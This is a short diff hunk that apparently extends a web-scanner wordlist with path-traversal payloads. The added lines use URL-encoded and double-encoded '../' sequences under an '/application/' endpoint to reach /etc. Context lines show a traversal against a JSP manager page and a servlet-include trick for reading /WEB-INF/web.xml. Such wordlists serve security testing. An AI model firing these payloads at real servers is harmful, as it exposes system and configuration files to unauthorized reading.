@@ -699,3 +699,8 @@
 /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
 /
 /{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
+/application/default
+/application/..%2F..%2F..%2F..%2F..%2Fetc
+/application/..%2F..%2F..%2F..%2F..%2Fetc/main
+/application/..%252F..%252F..%252F..%252F..%252Fetc
+/application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
